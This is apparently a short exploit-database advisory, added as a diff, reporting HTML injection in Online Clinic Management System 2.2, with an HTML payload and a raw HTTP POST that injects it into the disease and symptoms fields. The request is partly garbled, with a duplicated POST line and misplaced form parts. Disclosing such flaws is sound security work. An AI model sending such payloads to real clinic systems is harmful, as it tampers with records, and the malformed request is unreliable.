@@ -1,0 +1,84 @@
+# Exploit Title: Online Clinic Management System 2.2 - HTML Injection
+# Date: 2019-11-29
+# Exploit Author: Cemal Cihad ÇİFTÇİ
+# Vendor Homepage: https://bigprof.com
+# Software Download Link : https://bigprof.com/appgini/applications/online-clinic-management-system
+# Software : Online Clinic Management System
+# Version : 2.2
+# Vulernability Type : HTML Injection
+# Vulenrability : HTM Injection
+
+# HTML Injection has been discovered in the Online Clinic Management System created by bigprof/AppGini
+# add disase symptom, patient and appointment section.
+# payload: <b><i>asd</i></b>
+
+# HTTP POST request
+
+POST /inovicing/app/admin/pageEditGroup.php HTTP/1.1
+Host: 10.10.10.160
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+POST /clinic/disease_symptoms_view.php HTTP/1.1
+Host: 10.10.10.160
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------325041947016922
+Content-Length: 1501
+Origin: http://10.10.10.160
+Connection: close
+Referer: http://10.10.10.160/clinic/disease_symptoms_view.php
+Cookie: inventory=4eg101l42apiuvutr7vguma5ar; online_inovicing_system=vl8ml5or8sgdee9ep9lnhglk69; online_clinic_management_system=e3fqbalmcu4o9d4tvuuakpn9e8
+Upgrade-Insecure-Requests: 1
+
+ -----------------------------325041947016922
+Content-Disposition: form-data; name="current_view"
+
+ DV
+-----------------------------325041947016922
+
+Content-Disposition: form-data; name="SortField"
+-----------------------------325041947016922
+Content-Disposition: form-data; name="SelectedID"
+
+1
+-----------------------------325041947016922
+Content-Disposition: form-data; name="SelectedField"
+
+-----------------------------325041947016922
+Content-Disposition: form-data; name="SortDirection"
+
+-----------------------------325041947016922
+Content-Disposition: form-data; name="FirstRecord"
+
+1
+-----------------------------325041947016922
+Content-Disposition: form-data; name="NoDV"
+
+-----------------------------325041947016922
+Content-Disposition: form-data; name="PrintDV"
+
+-----------------------------325041947016922
+Content-Disposition: form-data; name="DisplayRecords" 
+
+all
+-----------------------------325041947016922
+Content-Disposition: form-data; name="disease"
+
+<b><i>asd</i></b>
+
+-----------------------------325041947016922
+Content-Disposition: form-data; name="symptoms"
+
+<b><i>asd</i></b>
+
+-----------------------------325041947016922
+Content-Disposition: form-data; name="reference"
+
+-----------------------------325041947016922
+Content-Disposition: form-data; name="update_x"
+
+1
+-----------------------------325041947016922
+Content-Disposition: form-data; name="SearchString"
+-----------------------------325041947016922--
